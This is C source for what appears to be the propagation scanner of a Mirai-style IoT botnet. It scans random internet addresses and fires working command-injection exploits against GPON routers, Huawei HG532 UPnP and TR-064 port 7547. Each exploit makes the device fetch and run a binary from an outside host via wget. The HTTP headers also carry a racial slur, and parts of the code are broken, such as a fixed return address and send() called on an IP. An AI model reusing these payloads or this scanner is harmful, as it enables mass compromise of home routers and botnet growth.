#define _GNU_SOURCE

#ifdef DEBUG
    #include <stdio.h>
#endif
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/prctl.h>
#include <sys/select.h>
#include <signal.h>
#include <sys/types.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <time.h>
#include <errno.h>
#include <stdint.h>
#include <string.h>

#include "includes.h"
#include "util.h"
#include "uid1_scanner.h"
#include "killer.h"
#include "rand.h"
#include "table.h"

void uid1_scanner(void)
{
    int pid = fork();
    if(pid > 0 || pid == -1)
        return;

    fd_set write_set;
    struct timeval timeout;
    socklen_t lon;

    int valopt = 0, max_fds = 0, cpu_cores = sysconf(_SC_NPROCESSORS_ONLN), res = 0, i = 0;

    rand_init();

    if(cpu_cores == 1)
        max_fds = 1000; 
    else if(cpu_cores > 1)
        max_fds = 1500;
    else
        exit(1);

    struct sockaddr_in dest_addr;
    struct scanner_state_t fds[max_fds];

    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(80);
    util_zero(dest_addr.sin_zero, sizeof(dest_addr.sin_zero));

    util_zero(fds, max_fds * (sizeof(int) + 1));

    for(i = 0; i < max_fds; i++)
    {
        util_zero(&(fds[i]), sizeof(struct scanner_state_t));
        fds[i].complete = 1;
        fds[i].state = SETUP_CONNECTION;
    }
	
    #ifdef DEBUG
        printf("[uid1] started with %d fds\n", max_fds);
    #endif

    while(TRUE)
    {
        for(i = 0; i < max_fds; i++)
        {
            if(fds[i].total_timeout == 0)
            {
                fds[i].total_timeout = time(NULL);
            }

            switch(fds[i].state)
            {
                case SETUP_CONNECTION:
                    if(fds[i].complete == 1)
                    {
                        util_zero(&(fds[i]), sizeof(struct scanner_state_t));
                        fds[i].ip = getip();
                    }

					srand(time(NULL));
					int scan_port = rand() % 5;
					switch(scan_port)
					{
						case 0:
							dest_addr.sin_port = htons(8080);
							fds[i].port = 8080;
							break;
						case 1:
							dest_addr.sin_port = htons(80);
							fds[i].port = 80;
							break;
						case 2:
							dest_addr.sin_port = htons(37215);
							fds[i].port = 37215;
							break;
						case 3:
							dest_addr.sin_port = htons(37215);
							fds[i].port = 37215;
							break;
						case 4:
							dest_addr.sin_port = htons(7547);
							fds[i].port = 7547;
							break;
						case 5:
							dest_addr.sin_port = htons(37215);
							fds[i].port = 37215;
							break;
						default:
							break;
					}
                    dest_addr.sin_family = AF_INET;
                    util_zero(dest_addr.sin_zero, sizeof(dest_addr.sin_zero));
                    dest_addr.sin_addr.s_addr = fds[i].ip;

                    fds[i].fd = socket(AF_INET, SOCK_STREAM, 0);
                    if(fds[i].fd == -1)
                        continue;

                    fcntl(fds[i].fd, F_SETFL, O_NONBLOCK | fcntl(fds[i].fd, F_GETFL, 0));

                    if(connect(fds[i].fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) == -1 && errno != EINPROGRESS)
                    {
                        close(fds[i].fd);
                        fds[i].complete = 1;
                        fds[i].total_timeout = 0;
                        continue;
                    }

                    fds[i].total_timeout = 0;
                    fds[i].state = CHECK_CONNECTION;
                    break;

                case CHECK_CONNECTION:
                    FD_ZERO(&write_set);
                    FD_SET(fds[i].fd, &write_set);

                    timeout.tv_sec = 0;
                    timeout.tv_usec = 100;

                    res = select(fds[i].fd + 1, NULL, &write_set, NULL, &timeout);
                    if(res == 1)
                    {
                        lon = sizeof(int);
                        valopt = 0;
                        getsockopt(fds[i].fd, SOL_SOCKET, SO_ERROR, (void *)(&valopt), &lon);
                        if(valopt)
                        {
                            close(fds[i].fd);
                            fds[i].complete = 1;
                            fds[i].total_timeout = 0;
                            fds[i].state = SETUP_CONNECTION;
                        }
                        else
                        {
                            fds[i].total_timeout = 0;
                            fds[i].state = INITILIZE_SESSION;
                        }
                        continue;
                    }
                    else if(res == -1)
                    {
                        close(fds[i].fd);
                        fds[i].complete = 1;
                        fds[i].total_timeout = 0;
                        fds[i].state = SETUP_CONNECTION;
                    }

                    if(fds[i].total_timeout + 5 < time(NULL))
                    {
                        close(fds[i].fd);
                        fds[i].complete = 1;
                        fds[i].total_timeout = 0;
                        fds[i].state = SETUP_CONNECTION;
                    }
                    break;

                case INITILIZE_SESSION:
					util_zero(fds[i].payload, sizeof(fds[i].payload));
					switch(fds[i].port)
					{
						case 80:
							#ifdef DEBUG
								printf("[uid1] Connection: %d.%d.%d.%d:%d\n", fds[i].ip & 0xff, (fds[i].ip >> 8) & 0xff, (fds[i].ip >> 16) & 0xff, (fds[i].ip >> 24) & 0xff, fds[i].port);
							#endif
							
							util_strcpy(fds[i].payload, "POST /GponForm/diag_Form?images/ HTTP/1.1\r\nUser-Agent: GPON Nigga\r\nAccept: */*\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nXWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`busybox+wget+http://l.ocalhost.host/gpon+-O+/tmp/SixWo;sh+/tmp/SixWo`&ipv=0\r\n\r\n");
							send(fds[i].ip, "POST /GponForm/diag_Form?images/ HTTP/1.1\r\nUser-Agent: GPON Nigga\r\nAccept: */*\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nXWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`busybox+wget+http://l.ocalhost.host/gpon+-O+/tmp/SixWo;sh+/tmp/SixWo`&ipv=0\r\n\r\n", util_strlen(fds[i].payload), MSG_NOSIGNAL);
							
							fds[i].state = FINNISHED;
							break;
						case 8080:
							#ifdef DEBUG
								printf("[uid1] Connection: %d.%d.%d.%d:%d\n", fds[i].ip & 0xff, (fds[i].ip >> 8) & 0xff, (fds[i].ip >> 16) & 0xff, (fds[i].ip >> 24) & 0xff, fds[i].port);
							#endif
							
							util_strcpy(fds[i].payload, "POST /GponForm/diag_Form?images/ HTTP/1.1\r\nUser-Agent: GPON Nigga\r\nAccept: */*\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nXWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`busybox+wget+http://l.ocalhost.host/gpon+-O+/tmp/SixWo;sh+/tmp/SixWo`&ipv=0\r\n\r\n");
							send(fds[i].ip, "POST /GponForm/diag_Form?images/ HTTP/1.1\r\nUser-Agent: GPON Nigga\r\nAccept: */*\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nXWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`busybox+wget+http://l.ocalhost.host/gpon+-O+/tmp/SixWo;sh+/tmp/SixWo`&ipv=0\r\n\r\n", util_strlen(fds[i].payload), MSG_NOSIGNAL);
							
							fds[i].state = FINNISHED;
							break;
						case 37215:
							#ifdef DEBUG
								printf("[uid1] Connection: %d.%d.%d.%d:%d\n", fds[i].ip & 0xff, (fds[i].ip >> 8) & 0xff, (fds[i].ip >> 16) & 0xff, (fds[i].ip >> 24) & 0xff, fds[i].port);
							#endif
							
							util_strcpy(fds[i].payload, "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1\r\nConnection: keep-alive\r\nAccept: */*\r\nAuthorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/ctrlt/DeviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", nc=00000001, cnonce=\"248d1a2560100669\"\r\n\r\n<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(/bin/busybox wget -g l.ocalhost.host -l /tmp/Ro02x -r /huawei; /bin/busybox chmod 777 * /tmp/Ro02x; /tmp/Ro02x huawei)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>\r\n\r\n");
							send(fds[i].ip, "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1\r\nConnection: keep-alive\r\nAccept: */*\r\nAuthorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/ctrlt/DeviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", nc=00000001, cnonce=\"248d1a2560100669\"\r\n\r\n<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(/bin/busybox wget -g l.ocalhost.host -l /tmp/Ro02x -r /huawei; /bin/busybox chmod 777 * /tmp/Ro02x; /tmp/Ro02x huawei)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>\r\n\r\n", util_strlen(fds[i].payload), MSG_NOSIGNAL);
							
							fds[i].state = FINNISHED;
							break;
						case 7547:
							#ifdef DEBUG
								printf("[uid1] Connection: %d.%d.%d.%d:%d\n", fds[i].ip & 0xff, (fds[i].ip >> 8) & 0xff, (fds[i].ip >> 16) & 0xff, (fds[i].ip >> 24) & 0xff, fds[i].port);
							#endif
							
							util_strcpy(fds[i].payload, "POST /UD/act?1 HTTP/1.1\r\nHost: 127.0.0.1:7547\r\nUser-Agent: GPON Nigga\r\nSOAPAction: urn:dslforum-org:service:Time:1#SetNTPServers\r\nContent-Type: text/xml\r\n\r\n<?xml version=\"1.0\"?><SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"> <SOAP-ENV:Body>  <u:SetNTPServers xmlns:u=\"urn:dslforum-org:service:Time:1\">   <NewNTPServer1>`cd /tmp;wget http://l.ocalhost.host/k;chmod 777 k;./k tr064`</NewNTPServer1>   <NewNTPServer2></NewNTPServer2>   <NewNTPServer3></NewNTPServer3>   <NewNTPServer4></NewNTPServer4>   <NewNTPServer5></NewNTPServer5>  </u:SetNTPServers> </SOAP-ENV:Body></SOAP-ENV:Envelope>\r\n\r\n");
							send(fds[i].ip, "POST /UD/act?1 HTTP/1.1\r\nHost: 127.0.0.1:7547\r\nUser-Agent: GPON Nigga\r\nSOAPAction: urn:dslforum-org:service:Time:1#SetNTPServers\r\nContent-Type: text/xml\r\n\r\n<?xml version=\"1.0\"?><SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"> <SOAP-ENV:Body>  <u:SetNTPServers xmlns:u=\"urn:dslforum-org:service:Time:1\">   <NewNTPServer1>`cd /tmp;wget http://l.ocalhost.host/k;chmod 777 k;./k tr064`</NewNTPServer1>   <NewNTPServer2></NewNTPServer2>   <NewNTPServer3></NewNTPServer3>   <NewNTPServer4></NewNTPServer4>   <NewNTPServer5></NewNTPServer5>  </u:SetNTPServers> </SOAP-ENV:Body></SOAP-ENV:Envelope>\r\n\r\n", util_strlen(fds[i].payload), MSG_NOSIGNAL);
							
							fds[i].state = FINNISHED;
							break;
						default:
							break;
					}
					fds[i].state = FINNISHED;
                    break;
                case FINNISHED:
					close(fds[i].fd);
                    fds[i].complete = 1;
                    fds[i].total_timeout = 0;
                    fds[i].state = SETUP_CONNECTION;
					break;
            }
        }
    }
}

ipv4_t getip(void)
{
    uint8_t ip_state[4];

    do
    {
        ip_state[0] = rand_next() % 0xff;
        ip_state[1] = rand_next() % 0xff;
        ip_state[2] = rand_next() % 0xff;
        ip_state[3] = rand_next() % 0xff;
    }
    while (ip_state[0] == 127 ||                             // 127.0.0.0/8      - Loopback
          (ip_state[0] == 0) ||                              // 0.0.0.0/8        - Invalid address space
          (ip_state[0] == 3) ||                              // 3.0.0.0/8        - General Electric Company
          (ip_state[0] == 15 || ip_state[0] == 16) ||                 // 15.0.0.0/7       - Hewlett-Packard Company
          (ip_state[0] == 56) ||                             // 56.0.0.0/8       - US Postal Service
          (ip_state[0] == 10) ||                             // 10.0.0.0/8       - Internal network
          (ip_state[0] == 192 && ip_state[1] == 168) ||               // 192.168.0.0/16   - Internal network
          (ip_state[0] == 172 && ip_state[1] >= 16 && ip_state[1] < 32) ||     // 172.16.0.0/14    - Internal network
          (ip_state[0] == 100 && ip_state[1] >= 64 && ip_state[1] < 127) ||    // 100.64.0.0/10    - IANA NAT reserved
          (ip_state[0] == 169 && ip_state[1] > 254) ||                // 169.254.0.0/16   - IANA NAT reserved
          (ip_state[0] == 198 && ip_state[1] >= 18 && ip_state[1] < 20) ||     // 198.18.0.0/15    - IANA Special use
          (ip_state[0] >= 224) ||                            // 224.*.*.*+       - Multicast
          (ip_state[0] == 6 || ip_state[0] == 7 || ip_state[0] == 11 || ip_state[0] == 21 || ip_state[0] == 22 || ip_state[0] == 26 || ip_state[0] == 28 || ip_state[0] == 29 || ip_state[0] == 30 || ip_state[0] == 33 || ip_state[0] == 55 || ip_state[0] == 214 || ip_state[0] == 215) // Department of Defense
    );

    return INET_ADDR(185,10,68,127);
}
